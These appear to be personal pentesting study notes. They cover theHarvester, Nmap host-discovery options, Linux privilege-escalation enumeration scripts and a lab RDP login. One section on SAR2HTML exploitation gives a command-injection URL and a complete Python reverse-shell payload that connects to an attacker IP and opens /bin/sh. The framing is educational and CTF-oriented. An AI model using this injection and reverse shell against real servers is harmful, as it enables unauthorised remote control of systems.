# **The Harvester – OSINT Email & Host Harvesting Tool**

### 🔍 **What is theHarvester?**

`theHarvester` is an **OSINT (Open Source Intelligence)** tool included in Kali Linux. It's used to gather **emails, subdomains, IPs, and hostnames** related to a target domain using **public sources** like search engines, social media, and breach databases.

---

### 🧰 **Key Features**

- Collects emails and subdomains
- Finds IPs, hosts, and DNS info
- Supports multiple data sources (Google, Bing, Yahoo, Baidu, Shodan, etc.)
- Useful in the **reconnaissance phase** of ethical hacking

---

### ⚙️ **Basic Syntax**

```bash
bash
CopyEdit
theHarvester -d <domain> -b <data_source>

```

### 🔑 Common Options:

| Flag | Description |
| --- | --- |
| `-d` | Target domain (e.g. `example.com`) |
| `-b` | Data source (`google`, `bing`, `github`, `shodan`, etc.) |
| `-l` | Limit results (e.g., 100) |
| `-f` | Save output to a file (HTML/XML) |
| `-v` | Verbose mode |

---

### ✅ **Example Usage**

```bash
bash
CopyEdit
theHarvester -d example.com -b bing -l 100 -f report_example

```

- Searches `example.com` using Bing
- Limits to 100 results
- Saves output to `report_example.html` and `report_example.xml`

📂 Output:

- **Emails**: admin@example.com, john.doe@example.com
- **Hosts**: mail.example.com, ftp.example.com
- **IP Addresses**: Resolved from hostnames

---

### 🧪 **Advanced Usage with Multiple Sources**

```bash
bash
CopyEdit
theHarvester -d example.com -b google,bing,linkedin,github -l 200 -f full_report

```

- Gathers from multiple engines for richer data

---

### 💡 Tips

- Add `v` for verbose mode to see real-time progress
- Use with caution; APIs (like Google) may limit access or need API keys
- Combine with `dnsenum`, `nmap`, or `Amass` for deeper scanning

# 🎯 RCE Injection Techniques — SAR2HTML Exploitation

## 🔹 1. `/index.php?plot=;whoami`

### ✅ Purpose:

To test if the target application is vulnerable to **Remote Code Execution** via parameter injection.

### 🔍 Breakdown:

- `plot=;whoami`
- The `;` ends the expected input and starts a new **shell command**
- `whoami` is a harmless Linux command that reveals the current user (e.g., `www-data`, `apache`, etc.)

### 🧠 Why & When to Use:

- **Why:** It’s a **non-destructive test** to confirm RCE without breaking anything.
- **When:** Use this *immediately after discovering a suspicious parameter*, like `plot=`, `cmd=`, `file=`, etc., in a web application.

---

## 🔹 2. `/index.php?plot=;python3 -c '...reverse shell code...'`

### ✅ Purpose:

To escalate from single-command execution to **interactive shell access**, enabling full control over the server.

### 🧨 Payload Breakdown:

```python
python
CopyEdit
python3 -c '
import socket,subprocess,os;
s=socket.socket();
s.connect(("10.0.2.5",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
'

```

### 🔧 What it does:

- Opens a socket to your attacker IP (`10.0.2.5`) on port `4444`
- Redirects the shell’s input/output to the socket
- Launches `/bin/sh` for an interactive session

### 🛠️ Requirements:

- **Python 3** installed on the target
- **Netcat listener** running:
    
    ```bash
    bash
    CopyEdit
    nc -lvnp 4444
    
    ```
    

### 🧠 Why & When to Use:

- **Why:** Allows continuous interaction with the victim system (navigation, file reads, privilege escalation).
- **When:** After confirming RCE works and you want **hands-on access** for deeper post-exploitation.

---

| URL | Purpose | When to Use |
| --- | --- | --- |
| `/plot=;whoami` | Confirm RCE vulnerability | First step after identifying injectable parameters |
| `/plot=;python3 -c ...` | Establish reverse shell | Once RCE confirmed and listener is ready |

## 🛠️ **What is Nmap?**

**Nmap (Network Mapper)** is a powerful open-source tool for **network discovery**, **port scanning**, and **vulnerability assessment**.

---

## 🔍 **Most Common Nmap Commands & Their Purpose**

| Command | Purpose |
| --- | --- |
| `nmap -sn <target>` | **Ping scan** (find live hosts, no port scan) |
| `nmap <target>` | Default scan (find open ports + basic info) |
| `nmap -sS <target>` | **Stealth SYN scan** (common & fast) |
| `nmap -sT <target>` | **TCP connect scan** (less stealthy, uses full TCP handshake) |
| `nmap -sU <target>` | **UDP scan** (for services like DNS, SNMP) |
| `nmap -sV <target>` | **Service version detection** (tells what service is running on a port) |
| `nmap -O <target>` | **OS detection** (guesses target's operating system) |
| `nmap -A <target>` | **Aggressive scan**: OS detection, version, script scan, traceroute |
| `nmap -p <ports> <target>` | Scan specific port(s), e.g., `-p 80`, `-p 1-1000` |
| `nmap -T<0-5> <target>` | Timing template: `-T4` is fast, `-T0` is slow/stealthy |
| `nmap -Pn <target>` | Skip host discovery (assume host is up even if it doesn't respond to ping) |
| `nmap --script <name>` | Run specific **NSE (Nmap Scripting Engine)** scripts |
| `nmap -6 <target>` | Scan IPv6 addresses |
| `nmap -oN <file>` | Save output to a normal text file |
| `nmap -oX <file>` | Save output to XML file (for automation) |
| `nmap -iL <file>` | Input list of IPs/domains from a file |
| `nmap -v` / `-vv` | Increase verbosity of the scan output |
| `nmap -R` | Always resolve DNS (use with caution) |
| `nmap -p-` | shows all 65000 ports |
| sudo nmap --stats-every 5s [scan options] TARGET
 | shows resutls every 5s |

---

## 🔤 **What is the `A` option?**

### 🔍 `nmap -A` = Aggressive Scan

**Performs a combination of advanced scans**:

✅ Includes:

- OS Detection (`O`)
- Service Version Detection (`sV`)
- Script Scanning (`-script=default`)
- Traceroute

⚠️ **Note**: It is **louder** (easier to detect) and may trigger IDS/IPS systems.

---

## 🧪 **Examples You Can Try**

```bash
nmap -sn 192.168.1.0/24       # Find all devices on local network
nmap -sS -p 22,80,443 10.0.0.5 # Stealth scan for SSH, HTTP, HTTPS
nmap -A example.com           # Full aggressive scan
nmap -sU -p 53 192.168.1.1     # UDP scan on DNS port
nmap -T4 scanme.nmap.org       # Faster scan
nmap -iL targets.txt           # Scan IPs listed in a file

```

---

## 🧠 Tip:

- Always use **sudo** with Nmap for full access (especially SYN, UDP, OS detection).

```bash
sudo nmap -sS -A -T4 192.168.1.1

```

## 🧠 What's a "Ping Scan" or "Host Discovery"?

Imagine you're checking which employees are present in an office by calling out names. That’s what **host discovery** is: checking **who is online**.

Nmap offers different **methods** (scan types) to do this – like calling out loud, knocking on doors, or sending a signal.

---

## ✅ Let’s Go Through Each Scan Type (With Easy Example and Explanation)

### 1. **ARP Scan**

```bash
sudo nmap -PR -sn 192.168.1.0/24

```

- **When used:** Only inside your local network (like scanning your office's private Wi-Fi).
- **How it works:** Sends **ARP requests** to every IP in that subnet. ARP is like checking everyone's name tag.
- **Result:** Fast and reliable. Only works in LAN.

---

### 2. **ICMP Echo Scan**

```bash
sudo nmap -PE -sn 192.168.1.0/24

```

- **How it works:** Sends a standard **ping (echo request)** to each machine.
- **Think of it as:** Shouting, “Are you there?” and waiting for a "Yes".
- **Limitation:** Firewalls often block this.

---

### 3. **ICMP Timestamp Scan**

```bash
sudo nmap -PP -sn 192.168.1.0/24

```

- **How it works:** Asks for the system clock time.
- **Why?** Some systems reply even if they don’t reply to normal ping.
- **Bonus:** Helps learn timezone of the host.

---

### 4. **ICMP Address Mask Scan**

```bash
sudo nmap -PM -sn 192.168.1.0/24

```

- **How it works:** Requests subnet mask.
- **Use case:** Rare, but some devices may respond only to this.
- **Think of it as:** Asking the person what area (subnet) they belong to.

---

### 5. **TCP SYN Ping Scan**

```bash
sudo nmap -PS22,80,443 -sn 192.168.1.0/30

```

- **How it works:** Sends SYN packets to ports 22, 80, 443 (like gentle knocks on the door).
- **If host is alive:** Host replies with SYN-ACK.
- **Used when:** ICMP is blocked but TCP is open.

---

### 6. **TCP ACK Ping Scan**

```bash
sudo nmap -PA22,80,443 -sn 192.168.1.0/30

```

- **Sends ACK packets** instead of SYN.
- **Why use it?** Some firewalls only allow ACK replies.

---

### 7. **UDP Ping Scan**

```bash
sudo nmap -PU53,161,162 -sn 192.168.1.0/30

```

- **How it works:** Sends UDP packets (to ports DNS 53, SNMP 161/162).
- **Why?** Some devices respond to these even when ignoring pings and TCP.
- **Think of it as:** Whispering in special language only some devices understand.

---

## 🧩 What Does `sn`, `n`, and `R` Mean?

### `sn`: **Skip port scan**

- You're only interested in **"who is online"**, not **"which doors are open"**.
- Like calling attendance without entering the room.

### `n`: **No DNS Lookup**

- Stops Nmap from trying to convert IP to domain name.
- Speeds things up, like working with IDs instead of names.

### `R`: **Do Reverse DNS Lookup**

- Forces Nmap to find names of all IPs.
- Slower, but helpful when identifying hostnames.

---

## 🎯 Summary Table

| Option/Scan Type | Meaning / Use Case | Simple Analogy |
| --- | --- | --- |
| `-sn` | Host discovery only | Just take attendance |
| `-n` | Skip DNS | Use raw IPs, no names |
| `-R` | Reverse DNS lookup | Try to get hostnames |
| `-PR` | ARP scan | Ask: “Who are you?” in LAN |
| `-PE` | ICMP Echo | Shout “Are you alive?” |
| `-PP` | ICMP Timestamp | Ask for time |
| `-PM` | ICMP Mask | Ask for subnet info |
| `-PS` | TCP SYN Ping | Knock quietly on known ports |
| `-PA` | TCP ACK Ping | Test firewall response |
| `-PU` | UDP Ping | Whisper in device language |

---

Let’s say you're on your office Wi-Fi (192.168.1.0/24) and want to see which devices are on:

```bash

```

## 🧰 Popular Linux Enumeration Tools (Explained Simply)

### 1. **LinPEAS**

🔗 [LinPEAS GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- **Most popular, comprehensive tool**
- Written in `bash`
- Scans for **vulnerable configs, weak permissions, passwords in files, cron jobs**, and more
- ✅ Works even without Python or advanced tools installed
- 🌟 Best "all-in-one" auto-scanner

> Use when: You want to scan everything quickly and broadly
> 

---

### 2. **LinEnum**

🔗 [LinEnum GitHub](https://github.com/rebootuser/LinEnum)

- Older but **very reliable Bash script**
- Lists OS info, SUID/SGID binaries, scheduled tasks, network configs, etc.
- Lighter than LinPEAS, but still powerful
- Easy to understand and customize

> Use when: You want a more readable, beginner-friendly scan
> 

---

### 3. **LES (Linux Exploit Suggester)**

🔗 [LES GitHub](https://github.com/mzet-/linux-exploit-suggester)

- Simple script that checks the **kernel version** and tells you what **public exploits** exist for it
- Helps find kernel privilege escalation paths (like dirty cow, dirty pipe, etc.)
- Requires `perl` (sometimes pre-installed)

> Use when: You suspect a vulnerable Linux kernel and want exploit suggestions
> 

---

### 4. **Linux Smart Enumeration (LSE)**

🔗 [LSE GitHub](https://github.com/diego-treitos/linux-smart-enumeration)

- A smart, **modular bash script** with 3 modes:
    - Fast (`q`)
    - Full (`a`)
    - Detailed (`d`)
- Nice balance between LinPEAS and LinEnum
- Good for targeted scans

> Use when: You want more control over the depth of your scan
> 

---

### 5. **Linux Priv Checker**

🔗 [LinuxPrivChecker GitHub](https://github.com/linted/linuxprivchecker)

- Written in Python
- Checks for common privilege escalation paths like:
    - SUID binaries
    - Writable cron jobs
    - Uncommon configurations
- Not as maintained, but still works well

> Use when: Python is installed and you want a fast, light scan
>

## 🖥️ RDP Access via `xfreerdp3` – Explained

### 📌 Command:

```bash
bash
CopyEdit
xfreerdp3 /v:10.10.118.52 /u:wade /p:'parzival' /cert:ignore +auto-reconnect /timeout:60000

```

---

### 🔍 **Parameter Breakdown**

| Parameter | Description |
| --- | --- |
| `/v:10.10.118.52` | Target IP address of the remote Windows machine |
| `/u:wade` | Username for the RDP login |
| `/p:'parzival'` | Password for the user `wade` (quoted for safety) |
| `/cert:ignore` | Ignores SSL certificate warnings (useful for self-signed certs) |
| `+auto-reconnect` | Automatically reconnects if the session drops |
| `/timeout:60000` | Sets the connection timeout to 60 seconds |

---

### 🧠 Why Use `xfreerdp3`?

- Fast, **terminal-based** way to initiate RDP sessions from Linux
- Perfect for **penetration testing labs**, CTFs, and TryHackMe challenges
- Lightweight alternative to GUI tools like **Remmina**
- Supports self-signed certs and handles disconnections gracefully
